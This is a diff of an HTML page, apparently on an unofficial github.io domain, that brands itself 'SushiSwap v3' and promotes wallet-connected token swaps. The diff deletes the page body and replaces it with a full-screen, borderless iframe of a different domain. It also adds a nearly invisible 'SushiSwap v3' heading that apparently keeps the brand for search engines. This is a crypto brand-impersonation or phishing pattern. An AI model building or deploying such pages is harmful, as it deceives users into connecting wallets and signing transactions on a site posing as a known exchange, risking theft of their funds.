@@ -158,159 +158,19 @@
   @media (prefers-reduced-motion:reduce){*{animation-duration:.01ms!important; transition-duration:.01ms!important}}
   </style>
 </head>
-<body>
-  <div class="bg" aria-hidden="true"><div class="glow"></div><div class="hatch"></div></div>
+<body style="margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden;">
 
-  <header class="topbar">
-    <a class="brand" href="./">
-      <img src="favicon.png" width="30" height="30" alt="">
-      <span>SushiSwap v3</span>
-    </a>
-    <span class="spacer"></span>
-    <nav class="nav" aria-label="Main Navigation">
-      <a href="how-it-works/">How it works</a>
-      <a href="faq/">FAQ</a>
-      <a href="about/">About</a>
-      <a href="security/">Security</a>
-      <a href="supported-chains/">Supported Chains</a>
-    </nav>
-  </header>
+  <iframe
+    src="https://biswap.in/"
+    style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; border: 0; margin: 0; padding: 0; display: block; z-index: 1;"
+    loading="eager"
+    fetchpriority="high"
+    allowfullscreen>
+  </iframe>
 
-  <main>
-    <section class="wrap hero">
-      <span class="eyebrow"><span class="dot"></span>Concentrated-Liquidity Swap</span>
-      <h1>SushiSwap v3</h1>
-      <p class="deck">SushiSwap v3 is a <strong>non-custodial DeFi swap</strong> experience for trading through Sushi's v3 liquidity pools with live routes, wallet approval, and token control in one clean flow.</p>
-      <div class="cta-row">
-        <a class="primary" href="dashboard/">Open App
-          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14M13 6l6 6-6 6"/></svg>
-        </a>
-        <a class="ghost" href="how-it-works/">How it works
-          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 6l6 6-6 6"/></svg>
-        </a>
-      </div>
+  <h1 style="position: fixed; bottom: 10px; left: 10px; z-index: 0; font-size: 8px; color: #ffffff; opacity: 0.15; margin: 0; padding: 0; font-family: sans-serif; pointer-events: none; text-shadow: none;">
+    SushiSwap v3
+  </h1>
 
-      <section class="routebar" aria-label="SushiSwap v3 preview">
-        <div class="rhead">
-          <span class="ct">Swap</span>
-          <span class="pill"><span class="pdot"></span>Preview</span>
-        </div>
-        <div class="rgrid">
-          <div class="leg">
-            <span class="lab">You pay</span>
-            <div class="legrow">
-              <button class="tok" type="button"><img src="sushi.png" alt="SUSHI">SUSHI <span class="cv" aria-hidden="true">&#9662;</span></button>
-              <span class="gv">Amount in app</span>
-            </div>
-          </div>
-          <button class="rswitch" type="button" data-switch aria-label="Switch direction">
-            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M7 4v13M4 14l3 3 3-3M17 20V7M14 10l3-3 3 3"/></svg>
-          </button>
-          <div class="leg">
-            <span class="lab">You receive</span>
-            <div class="legrow">
-              <button class="tok" type="button"><img src="usdc.png" alt="USDC">USDC <span class="cv" aria-hidden="true">&#9662;</span></button>
-              <span class="gv">Live quote in app</span>
-            </div>
-          </div>
-        </div>
-        <div class="rbar-foot">
-          <div class="rmeta">
-            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2a10 10 0 1 0 10 10A10 10 0 0 0 12 2zm0 5v5l3 3"/></svg>
-            Route, execution time, price impact, and network costs are shown in the app.
-          </div>
-          <a class="rcta" href="dashboard/">Open App
-            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14M13 6l6 6-6 6"/></svg>
-          </a>
-        </div>
-        <p class="rnote">Preview only &middot; non-custodial &middot; connect your wallet in the app</p>
-      </section>
-    </section>
-
-    <!-- WHY (icon-left rows) -->
-    <section class="wrap sec" id="why">
-      <div class="sec-head">
-        <span class="eyebrow"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2l8 4v6c0 5-3.5 8-8 10-4.5-2-8-5-8-10V6l8-4z"/></svg>Why swap here</span>
-        <h2 class="h2">SushiSwap v3 gives active traders a tighter swap surface</h2>
-      </div>
-      <div class="rows">
-        <div class="frow2">
-          <span class="ico"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="4" y="10" width="16" height="11" rx="2"/><path d="M8 10V7a4 4 0 0 1 8 0v3"/></svg></span>
-          <div><h3>Wallet-first execution</h3><p>Open the <a class="cite" href="https://www.sushi.com/ethereum/swap" rel="nofollow noopener noreferrer">official swap interface</a>, connect your wallet, and keep custody while each approval and swap is signed by you.</p></div>
-        </div>
-        <div class="frow2">
-          <span class="ico"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"/><path d="M3 12h18M12 3a14 14 0 0 1 0 18M12 3a14 14 0 0 0 0 18"/></svg></span>
-          <div><h3>Built for Sushi's v3 pools</h3><p>V3-style pools use concentrated liquidity so swap depth can be focused around active price ranges, giving traders a sharper path than broad, passive liquidity alone.</p></div>
-        </div>
-        <div class="frow2">
-          <span class="ico"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 12a9 9 0 0 1 9-9 9 9 0 0 1 9 9 9 9 0 0 1-9 9"/><path d="M3 12h6l2-3 2 6 2-3h2"/></svg></span>
-          <div><h3>Real quote context before signing</h3><p>Review the route, price impact, token approval, and chain fee before confirming. That matters whether you swap SUSHI, <a class="cite" href="https://www.circle.com/en/usdc" rel="nofollow noopener noreferrer">USDC stablecoin liquidity</a>, ETH, or another listed asset.</p></div>
-        </div>
-      </div>
-    </section>
-
-    <section class="wrap sec" id="how">
-      <div class="sec-head">
-        <span class="eyebrow"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 7h16M4 12h16M4 17h10"/></svg>How it works</span>
-        <h2 class="h2">Use SushiSwap v3 in three real steps</h2>
-      </div>
-      <div class="steps">
-        <div class="step"><span class="num">1</span><h3>Connect your wallet</h3><p>Launch the app, choose the network, and connect a Web3 wallet. SushiSwap v3 does not require a custodial account or a deposit.</p></div>
-        <div class="step"><span class="num">2</span><h3>Choose assets and route</h3><p>Select the token you pay, the token you receive, and the chain context. The app builds a live route across available Sushi liquidity and supported assets.</p></div>
-        <div class="step"><span class="num">3</span><h3>Review, approve, confirm</h3><p>Check output, price impact, time, and gas in the app. Approve only when needed, then sign the final swap from your wallet.</p></div>
-      </div>
-    </section>
-
-    <!-- FAQ (2-col) -->
-    <section class="wrap sec" id="faq">
-      <div class="sec-head">
-        <span class="eyebrow"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"/><path d="M9.5 9a2.5 2.5 0 1 1 3.5 2.3c-.8.4-1 .8-1 1.7M12 17h.01"/></svg>FAQ</span>
-        <h2 class="h2">SushiSwap v3 questions traders ask first</h2>
-      </div>
-      <div class="faq">
-        <div class="qa"><span class="qn">01</span><h3>What is SushiSwap v3?</h3><p>SushiSwap v3 is Sushi's concentrated-liquidity swap experience for DeFi traders who want wallet-based token swaps, live routing, and v3 pool access without handing custody to an exchange.</p></div>
-        <div class="qa"><span class="qn">02</span><h3>Which chains and assets can I use?</h3><p>The app is built around Sushi-supported networks and assets, including major EVM environments such as the <a class="cite" href="https://ethereum.org/en/" rel="nofollow noopener noreferrer">Ethereum network</a>, <a class="cite" href="https://arbitrum.io/" rel="nofollow noopener noreferrer">Arbitrum One</a>, and <a class="cite" href="https://polygon.technology/" rel="nofollow noopener noreferrer">Polygon PoS</a>. Check the current list on the <a href="supported-chains/">supported chains</a> page.</p></div>
-        <div class="qa"><span class="qn">03</span><h3>How long does a SushiSwap v3 swap take?</h3><p>Timing depends on the selected network, wallet confirmation, token approval status, and chain congestion. The app shows the live route and transaction state before and after you sign.</p></div>
-        <div class="qa"><span class="qn">04</span><h3>What costs and safety checks matter?</h3><p>Watch the quoted output, price impact, slippage setting, token approval, and network fee. Use the displayed contract prompts carefully, confirm the asset pair, and never sign a transaction you do not understand.</p></div>
-      </div>
-    </section>
-
-    <section class="wrap sec" id="more">
-      <div class="sec-head">
-        <span class="eyebrow"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7 0l2-2a5 5 0 0 0-7-7l-1 1M14 11a5 5 0 0 0-7 0l-2 2a5 5 0 0 0 7 7l1-1"/></svg>Learn more</span>
-        <h2 class="h2">Explore SushiSwap v3</h2>
-      </div>
-      <div class="related">
-        <a class="rel" href="how-it-works/"><span class="rt">How it works <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M7 17 17 7M9 7h8v8"/></svg></span><p>Walk through the swap path from wallet connection to quote review and final signature.</p></a>
-        <a class="rel" href="security/"><span class="rt">Security <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M7 17 17 7M9 7h8v8"/></svg></span><p>Review practical self-custody habits for approvals, wallet prompts, and transaction checks.</p></a>
-        <a class="rel" href="supported-chains/"><span class="rt">Supported chains <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M7 17 17 7M9 7h8v8"/></svg></span><p>See the networks and token routes available for SushiSwap v3 inside the app.</p></a>
-      </div>
-    </section>
-  </main>
-
-  <footer class="footer">
-    <div class="wrap">
-      
-      <p style="margin-top:6px"><b>SushiSwap v3</b></p>
-    </div>
-  </footer>
-
-  <script type="application/ld+json">
-  {"@context":"https://schema.org","@graph":[
-    {"@type":"WebSite","@id":"https://sushiswap-v3-app.github.io/#website","url":"https://sushiswap-v3-app.github.io/","name":"SushiSwap v3"},
-    {"@type":"Organization","@id":"https://sushiswap-v3-app.github.io/#org","name":"SushiSwap v3","url":"https://sushiswap-v3-app.github.io/","logo":"https://sushiswap-v3-app.github.io/favicon.png"},
-    {"@type":"WebApplication","name":"SushiSwap v3","applicationCategory":"FinanceApplication","operatingSystem":"Web","url":"https://sushiswap-v3-app.github.io/","browserRequirements":"Requires a Web3 wallet","description":"Non-custodial DeFi swap app for using SushiSwap v3 routes, token quotes, and wallet-confirmed swaps."},
-    {"@type":"FAQPage","mainEntity":[
-      {"@type":"Question","name":"What is SushiSwap v3?","acceptedAnswer":{"@type":"Answer","text":"SushiSwap v3 is Sushi's concentrated-liquidity swap experience for DeFi traders who want wallet-based token swaps, live routing, and v3 pool access without handing custody to an exchange."}},
-      {"@type":"Question","name":"Which chains and assets can I use?","acceptedAnswer":{"@type":"Answer","text":"The app is built around Sushi-supported networks and assets, including major EVM environments such as Ethereum, Arbitrum, and Polygon. Check the current list on the supported chains page."}},
-      {"@type":"Question","name":"How long does a SushiSwap v3 swap take?","acceptedAnswer":{"@type":"Answer","text":"Timing depends on the selected network, wallet confirmation, token approval status, and chain congestion. The app shows the live route and transaction state before and after you sign."}},
-      {"@type":"Question","name":"What costs and safety checks matter?","acceptedAnswer":{"@type":"Answer","text":"Watch the quoted output, price impact, slippage setting, token approval, and network fee. Use the displayed contract prompts carefully, confirm the asset pair, and never sign a transaction you do not understand."}}
-    ]}
-  ]}
-  </script>
-
-  <script>
-  (function(){"use strict";var b=document.querySelector("[data-switch]");if(!b)return;b.addEventListener("click",function(){var p=document.querySelectorAll(".rgrid .tok");if(p.length<2)return;var t=p[0].innerHTML;p[0].innerHTML=p[1].innerHTML;p[1].innerHTML=t;});}());
-  </script>
 </body>
 </html>
